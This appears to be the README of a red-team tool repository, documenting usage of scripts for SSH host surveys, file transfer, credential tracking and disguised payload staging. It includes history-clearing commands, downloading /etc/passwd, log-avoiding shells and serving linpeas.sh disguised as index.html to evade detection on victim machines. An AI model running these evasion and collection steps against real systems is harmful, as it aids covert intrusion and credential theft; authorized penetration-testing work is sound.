# Survey
# Installation 
````
git clone https://github.com/ice-wzl/red-team-tools.git
cd red-team-tools/
pip install requirements.txt
````
# survey.py
## Overview
- Script conducts a hosted based survey on a remote linux system with either a key or a password.  
- Place the commands you want to run in a file or use the one provided.  Ensure commands are seperated with newline
````
cat config.cfg 
unset HISTFILE HISTFILESIZE HISTSIZE PROMPT_COMMAND
id
last
who
ps awwux --forest 
netstat -antpu 
ls -la /var/log
````
## Help
````
python3 survey.py -h
usage: survey.py [-h] [-t TARGET] [-u USERNAME] [-c CONFIG] [-P PORT] (-k KEY | -p PASSWORD)

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
  -u USERNAME, --username USERNAME
  -c CONFIG, --config CONFIG
                        path to config file with commands to run on the remote host seperated by a new line.
  -P PORT, --port PORT  the remote port to connect to
  -k KEY, --key KEY
  -p PASSWORD, --password PASSWORD
````
# transport.py
## Overview
- Script allows for file upload and download to remote host with a password (key option coming soon)
- Script has two help menus, the first one to help you connect to the target, view with `python3 transport.py -h`
````
python3 transport.py -h
usage: transport.py [-h] [-t TARGET] [-P PORT] [-u USERNAME] [-p PASSWORD]

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
  -P PORT, --port PORT
  -u USERNAME, --username USERNAME
  -p PASSWORD, --password PASSWORD
````
- Second help menu is for when you are connected to target, `help`
````
root@10.0.0.5---> help

                exit     --> exit program
                help     --> print this menu
                upload   --> put local file on remote machine
                download --> download remote file to location machine. 
                             save path is your pwd + remote file name 
                lcd      --> change local directory
                lls      --> list current local directory
                cat      --> view file
                pwd      --> see current working directory 
                clear    --> clear screen
````
## How to upload 
````
root@10.0.0.5---> upload
local file to put up: test.txt
remote path for file: /tmp/.hidden.txt
````
## How to download 
````
root@10.0.0.5:# download                                                                                                          
remote file to grab: /etc/passwd
Downloading: [100.0%] [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]  
Download Success /etc/passwd
````
- Verify that your download worked 
- Download will rebuilt the target file system on your local machine 
````
[rocky@rocky red-team-tools]$ tree
.
├── 10.0.0.5
│   └── etc
│       └── passwd
````
- `lls`
````
root@10.0.0.5---> lls .
total 40
drwxrwxr-x. 3 rocky rocky  159 Mar 23 16:48 .
drwxrwxr-x. 3 rocky rocky   44 Mar 23 16:40 ..
-rw-rw-r--. 1 rocky rocky 1790 Mar 23 16:48 passwd
````
- The other commands are common linux commands.
# ssh-download.py
## Overview 
- This script will interface with an ssh socket file to allow you to upload/download files in a variety of ways in addition to spawning additional shells
- Will download/upload single files
- Will download/upload whole directories
- Will download/upload files with compression (gzip)
- All upload and downloads will be encrypted (as it is over your currently established ssh session)
- run single commands
- spawn additional shells (if you need a second one or your origional one hangs)
## Benifits of this tool
- 1. Allows for quick file collect over ssh
- 2. Avoids all additional logging. The only thing that will log is your origional ssh connection.
    - None of your additional shells/file upload/downloads will log at all
    - Dont believe me, try it yourself.
### Establish your SSH connection 
- the most opsec savvy way to ssh to a remote host
````
ssh -vx -o ServerAliveInterval=90 -o ServerAliveCountMax=240 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -CMS /tmp/sock -p 22 rocky@10.0.0.3 /bin/sh
````
- now in another window start `ssh-download.py`
- pass in the username you want to use (doesnt really matter what you put here)
- pass in your socket file you established in your ssh line, for the example it is `/tmp/sock`
````
python3 ssh-download.py -s '/tmp/sock' -u x

         ,MMM8&&&.
    _...MMMMM88&&&&..._
 .::'''MMMMM88&&&&&&'''::.
::     MMMMM88&&&&&&     ::
'::....MMMMM88&&&&&&....::' - Created by: ice-wzl
   `''''MMMMM88&&&&''''`    - v1.0.0
         'MMM8&&&'


remotehost-->
````
- you will be greeted with the prompt
- to see all available commands hit the `<tab>` character
- ![image](https://github.com/ice-wzl/red-team-tools/assets/75596877/bdbe91d6-529d-40ca-b3ff-2a94800cd5ff)
### shell
- spawns a new shell, useful if your origional shell hangs or you want to spawn another one without logging more
- choose your shell type, or just hit enter to use the default `/bin/sh`
- ![image](https://github.com/ice-wzl/red-team-tools/assets/75596877/38295452-8a6a-4498-9a5e-179f9b124131)
### cmd
- use this to run a single cmd, useful for a reverse shell or other commands you dont need the stdout
- Note: this command will run but you will not see the stdout from the executed command
- pass in your cmd at the prompt
- ![image](https://github.com/ice-wzl/red-team-tools/assets/75596877/24f9b672-bd7c-470f-a371-a65d52a41e68)
### exit
- will exit the script
- your socket file will still be active due to your master ssh window
- feel free to rerun the script, it will work as long as your master connection is still active
### structure 
- will create a directory called `target` below the file path you pass in
- for example if you pass in `/tmp` it will create a directory `/tmp/target`
- if you pass in a path in which `target` already exists the script will inform you of such
````
remotehost--> structure                                                                                             
Enter abs path to create directory tree: /tmp
2023-09-17 14:09:39,807 - /tmp/target already exists
remotehost--> structure                                                                                             
Enter abs path to create directory tree: /home/kali/Documents
remotehost-->
--new window--
ls -la ~/Documents/target
total 444
drwxr-xr-x  2 kali kali   4096 Sep 17 14:09 .
drwxr-xr-x 17 kali kali 446464 Sep 17 14:09 ..
````




# cred-manager.py 
## Overview 
- Script will manage your credentials for all targets on an engagement.  Ive found this helpful in large enterprises where storing all those key accounts is not practical.
- This helps when you have like 20-50 credentials and you want to keep track of the username, password and ip address of where they came from.
- This is not designed to keep track of 10000 user credentials, unless you want to enter those all in by hand (I do not).
## create
- Creates database and table called `TARGETS`
````
localhost--> create
Table Created
````
## view
- See what is currently saved
````
localhost--> view
Data in Table:
(1, '10.10.10.100', 'Administrator', 'Passw0rd')
(2, '10.10.10.101', 'Ryan', 'Password123!@#')
````
## add
````
localhost--> add
Enter unique ID: 1
Enter IP Address: 10.10.10.100
Enter Username: Administrator
Enter Password: Passw0rd
````
## help
````
localhost--> help
{Create | View | Add | Delete | Exit}
````
## secure-http
- Secure file sharing between your attack box and a victim machine.
- Requires the client to check in with a secret key in order to be able to pull down the hosted file.
- Whatever file you host it will be encrypted and served as `index.html` in order to better blend in with victim machines web traffic 
- It never looks good if a victim machine is attempting to pull down `http://10.10.10.10:80/linpeas.sh`, `http://10.10.10.10:80/index.html` looks better 
- The client will then ask you for the password to decrypt your file and it will save it off to what you specify 
### server.py 
- help
````
python3 server.py -h
usage: server.py [-h] [-i IPADDRESS] [-p PORT] [-f FILE] [-v] [--version]

optional arguments:
  -h, --help            show this help message and exit
  -i IPADDRESS, --ipaddress IPADDRESS
  -p PORT, --port PORT
  -f FILE, --file FILE
  -v, --verbose         Verbosity (-v, -vv, etc)
  --version             show program's version number and exit
````
### client.py 
````
python3 client.py -h
usage: client.py [-h] [-i IPADDRESS] [-p PORT] [-f FILE] [-b BLEND] [-v] [--version]

optional arguments:
  -h, --help            show this help message and exit
  -i IPADDRESS, --ipaddress IPADDRESS
                        The ip address to connect back to
  -p PORT, --port PORT
  -f FILE, --file FILE  The file to pull down, it will be the same as the server.py -f option
  -b BLEND, --blend BLEND
                        Decrypted out file name, make sure to pick something that blends on the target
  -v, --verbose         Verbosity (-v, -vv, etc)
  --version             show program's version number and exit
  ````
  ### Walkthrough 
  - Host the file you want 
  ````
python3 server.py -i 10.0.0.3 -p 8080 -f linpeas.sh
🔨 Server hosting lipeas.sh as index.html at 10.0.0.3 on port 8080 🔨

Run on the client (change the -b option to something that blends): 
python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b decrypted
````
- Now request the file with the provided command 
````
python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b hidden-file
receiving data...
Success
Connection closed

Recieved file with MD5: 8ab5d0c7f44936baadb414ad5435eed1

Enter password for decryption: 
````
- When a valid request comes in the server will show you the password to enter on the client side 
````
python3 server.py -i 10.0.0.3 -p 8080 -f linpeas.sh
🔨 Server hosting linpeas.sh as index.html at 10.0.0.3 on port 8080 🔨

Run on the client (change the -b option to something that blends): 
python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b decrypted

Got connection from ('10.0.0.3', 49510)
Recieved Key: b'wK1NLC7DUO2N73E1AxGE'
Your password to decrypt is: cuHscLbLvTFuyUForQwd
Sent encrypted file with MD5: 8ab5d0c7f44936baadb414ad5435eed1
````
- Once the password is entered the client will tell you the file is decrypted and it will ne named whatever your `-b` parameter was set to 
````
python3 client.py -i 10.0.0.3 -p 8080 -f index.html -b hidden-file
receiving data...
Success
Connection closed

Recieved file with MD5: 8ab5d0c7f44936baadb414ad5435eed1

Enter password for decryption: cuHscLbLvTFuyUForQwd
File Decrypted
````
- The encrypted `index.html`
````
head index.html 
Salted__�Ť2����z7|�7��t�{vu���k��ߝ(*z�	�#��
                                            �c�N�}w{�ISh{�L���W�?�ɾ���t����IpH>��%����~����vG@����Ff"�"���8e,u�2g��X��4:5JO�u�>��{�@'��6�Ȫb��� K�R�y��r���w(��7S1�#myQ���RK-|���H!�ӥ
��
  �����X���뺑;+�\p#�K#AH�������-[��	����u)EU��]�Pi�?���S#dV�E�������Ռ���e�[�9_�yu��+����
````
- The decrypted `linpeas.sh`
````
head hidden-file 
#!/bin/sh

VERSION="ng"
ADVISORY="This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission."
````
## Considerations
- `client.py` was built with only standard library imports as to not require the target machine to have any special installs.  If the target has `python3` installed `client.py` will work!
# libre-translate-setup.sh
- Quick script to clone, install and run the offline Libre Tranlate project on your local station.  Avoids having to use Google Translate or a similar source if translating sensitive content.
- Ensure you use the fully offline version (takes up quite a bit of space) versus the version of this project that utilizes the Google Translate API (to save on space) as you will still be making remote translation requests for your sensitive content.
# clip.py
- Simple clipboard manager, always know what is in your clipboard buffer.
- When you copy something you will see it in this window
- I make this window small and in the bottom right hand part of my screen.
```
python3 clip.py
````
- resize the window to your own desire.
